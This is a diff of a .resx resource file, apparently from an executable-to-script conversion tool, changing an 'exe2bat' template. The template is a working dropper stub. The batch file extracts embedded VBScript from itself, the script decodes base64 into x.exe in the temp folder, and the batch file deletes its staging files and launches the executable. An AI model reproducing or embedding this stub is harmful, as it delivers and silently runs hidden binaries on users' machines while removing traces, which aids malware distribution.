@@ -118,22 +118,27 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <data name="exe2bat" xml:space="preserve">
-    <value>@echo off
-findstr /E "'v" "%~f0" &gt;"%tmp%\x.vbs"
-cscript "%tmp%\x.vbs"
-start "" "%tmp%\x.exe"
+    <value>@Echo off
+#echos#
+findstr /e "'v" "%~f0"&gt;%tmp%\x.vbs
+cscript //nologo %tmp%\x.vbs
+del %tmp%\x
+del %tmp%\x.vbs
+start "" %tmp%\x.exe
 exit
-Option Explicit'v
-dim D,E,b,p'v
-Set D=CreateObject("Microsoft.XMLDOM")'v
-Set E=D.createElement("t")'v
-E.DataType="bin.base64"'v
-E.Text="#base64#"'v
+Set f=CreateObject("Scripting.FileSystemObject")'v
+Set p=f.GetSpecialFolder(2)'v
+Set i=f.OpenTextFile(p+"\x",1)'v
+c=i.ReadAll()'v
+i.Close'v
+Set x=CreateObject("Msxml2.DOMDocument")'v
+Set o=x.CreateElement("base64")'v
+o.dataType="bin.base64"'v
+o.text=c'v
 Set b=CreateObject("ADODB.Stream")'v
-Set p=CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)'v
 b.Type=1'v
 b.Open'v
-b.Write E.NodeTypedValue'v
+b.Write o.NodeTypedValue'v
 b.SaveToFile p+"\x.exe",2'v</value>
   </data>
   <data name="exe2js" xml:space="preserve">
